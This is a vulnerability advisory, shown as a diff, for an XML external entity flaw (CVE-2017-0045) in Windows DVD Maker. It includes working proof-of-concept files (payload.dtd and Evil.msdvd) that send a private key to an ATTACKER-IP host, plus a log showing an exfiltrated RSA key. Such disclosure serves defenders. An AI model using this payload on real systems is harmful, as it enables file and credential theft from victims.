@@ -1,0 +1,157 @@
+[+] Credits: John Page AKA hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-DVD-MAKER-XML-EXTERNAL-ENTITY-FILE-DISCLOSURE.txt
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+=================
+www.microsoft.com
+
+
+
+Product:
+=================
+Windows DVD Maker 
+v6.1.7
+
+Windows DVD Maker is a feature you can use to make DVDs that you can watch on a computer or on a TV using a regular DVD player. 
+
+
+
+Vulnerability Type:
+=============================
+XML External Entity Injection
+
+
+
+CVE Reference:
+==============
+CVE-2017-0045 
+MS17-020
+
+
+
+Security issue:
+================
+Windows DVD Maker Project ".msdvd" files are prone to XML External Entity attacks allowing remote attackers to gain access
+to files from a victims computer using a specially crafted malicious .msdvd file, resulting in remote information / file disclosures. 
+
+
+POC URL:
+=========
+https://vimeo.com/208383182
+
+
+References:
+============
+https://technet.microsoft.com/library/security/MS17-020
+https://support.microsoft.com/en-us/help/3208223/ms17-020-security-update-for-windows-dvd-maker-march-14-2017
+
+Applies to:
+
+Windows Server 2008 R2 Service Pack 1
+Windows Server 2008 R2 Datacenter
+Windows Server 2008 R2 Enterprise
+Windows Server 2008 R2 Standard
+Windows Web Server 2008 R2
+Windows Server 2008 R2 Foundation
+Windows 7 Service Pack 1
+Windows 7 Ultimate
+Windows 7 Enterprise
+Windows 7 Professional
+Windows 7 Home Premium
+Windows 7 Home Basic
+Windows 7 Starter
+Windows Server 2008 Service Pack 2
+Windows Server 2008 Foundation
+Windows Server 2008 Standard
+Windows Server 2008 for Itanium-Based Systems
+Windows Web Server 2008
+Windows Server 2008 Enterprise
+Windows Server 2008 Datacenter
+Windows Vista Service Pack 2
+Windows Vista Home Basic
+Windows Vista Home Premium
+Windows Vista Business
+Windows Vista Ultimate
+Windows Vista Enterprise
+Windows Vista Starter
+
+
+
+Exploit code(s):
+===============
+Steal XAMPP Web Servers private key "server.key".
+
+1) python -m SimpleHTTPServer 8080 (listens on ATTACKER-IP, hosts payload.dtd)
+
+
+2) "payload.dtd"
+
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER-IP:8080?%file;'>">
+
+%all;
+
+
+
+3) "Evil.msdvd" 
+
+<?xml version="1.0"?>
+<!DOCTYPE NYHC [ 
+<!ENTITY % file SYSTEM "C:\xampp\apache\conf\ssl.key\server.key">
+<!ENTITY % dtd SYSTEM "http://ATTACKER-IP:8080/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+
+RESULT:
+XAMPP Web Server private key sent to attacker:
+
+e.g.
+
+C:\>python -m SimpleHTTPServer 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+
+127.0.0.1 - - [13/Mar/2017 23:53:36] "GET /payload.dtd HTTP/1.1" 200 -
+127.0.0.1 - - [13/Mar/2017 23:53:36] "GET /?-----BEGIN%20RSA%20PRIVATE%20KEY-----MIICXQIBAAKBgQDBJdMn4+ytDYNqbedfmnUQI+KQnaBjlY8dQZpY1ZpjjFtzhpB5zMPWo3m4dbwelHx8buOt0CdcC8YMavkPMv6zxHoQIwQrKSjUqvmzL2YQ+KfBzWDEayhX42c7957NSCLcOOpIE4A6QJdXDEc1Rj1xYpruU51jDmd6KMmkNP8Z7QIDAQABAoGBAJvUs58McihQrcVRdIoaqPXjrei1c/DEepnFEw03EpzyYdo8KBZM0Xg7q2KKgsM9U45lPQZTNmY6DYh5SgYsQ3dGvocvwndq+wK+QsWH8ngTYqYqwUBBCaX3kwgknAc++EpRRVmV0dJMdXt3xAUKSXnDP9fLPdKXffJoG7C1HHVVAkEA+087rR2FLCjdRq/9WhIT/p2U0RRQnMJyQ74chIJSbeyXg8E
+ll5QxhSg7skrHSZ0cBPhyaLNDIZkn3NMnK2UqhwJBAMTAsUorHNo4dGpO8y2HE6QXxeuX05OhjiO8H2hmkcuMi2C9OwGIrI+lx1Q8mK261NKJh7sSVwQikh5YQYLKcOsCQQD6YqcChDb7GHvewdmatAhX1ok/Bw6KIPHXrMKdA3s9KkyLaRUbQPtVwBA6Q2brYS1Zhm/3ASQRhZbB3V9ZTSJhAkB772097P5Vr24VcPnZWdbTbG4twwtxWTix5dRa7RY/k55QJ6K9ipw4OBLhSvJZrPBWVm97NUg+wJAOMUXC30ZVAkA6pDgLbxVqkCnNgh2eNzhxQtvEGE4a8yFSUfSktS9UbjAATRYXNv2mAms32aAVKTzgSTapEX9M1OWdk+/yJrJs-----END%20RSA%20PRIVATE%20KEY----- HTTP/1.1" 301 -
+127.0.0.1 - - [13/Mar/2017 23:53:37] "GET /?-----BEGIN%20RSA%20PRIVATE%20KEY-----MIICXQIBAAKBgQDBJdMn4+ytDYNqbrdfmnUQI+KQnaBjlY8dQZpY1ZxjjFtzhpB5zMPmo4m4dbwelHx8buOt6CdcC8YMavkPMv6zxHoQIwQrKSjUqvmzL2YQ+KfBzWDEayhX42c7957NSCLcOOpIE4A6QJdXDEc1Rj1xYpruU51jDmd6KMmkNP8Z7QIDAQABAoGBAJvUs58McihQrcVRdIoaqPXjrei1c/DEepnFEw03EpzyYdo8KBZM0Xg7q2KKgsM9U45lPQZTNmY6DYh5SgYsQ3dGvocvwndq+wK+QsWH8ngTYqYqwUBBCaX3kwgknAc++EpRRVmV0dJMdXt3xAUKSXnDP9fLPdKXffJoG7C1HHVVAkEA+087rR2FLCjdRq/9WhIT/p2U0RRQnMJyQ74chIJSbeyXg8E
+ll5QxhSg7skrHSZ0cBPhyaLNDIZkn3NMnK2UqhwJBAMTAsUorHNo4dGpO8y2HE6QXxeuX05OhjiO8H2hmmcuMi2C9OwGIrI+lx1Q8mK261NKJh7sSVwQikh3YQYiKcOsCQQD6YqcChDb7GHvewdmatAhX1ok/Bw6KIPHXrMKdA3s9KkyLaRUbQPtVwBA6Q2brYS1Zhm/3ASQRhZbB3V9ZTSJhAkB772097P5Vr24VcPnZWdbTbG4twwtxWTix5dRa7RY/k55QJ6K9ipw4OBLhSvJZrPBWVm97NUg+wJAOMUXC30ZVAkA6pDgLbxVqkCnNgh2eNzhxQtvEGE4a8yFSUfSktS9UbjAATRYXNv2mAms32aAVKTzgSTapEX9M1OWdk+/yJrJs-----END%20RSA%20PRIVATE%20KEY-----/ HTTP/1.1" 200 -
+
+
+
+
+Disclosure Timeline:
+=========================================
+Vendor Notification: September 3, 2016
+Vendor acknowledgement: November 17, 2016
+March 14, 2017 : Vendor released MS17-020
+March 15, 2017 : Public Disclosure
+
+
+
+Network access:
+=================
+Remote
+
+
+
+Severity:
+===========
+High
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
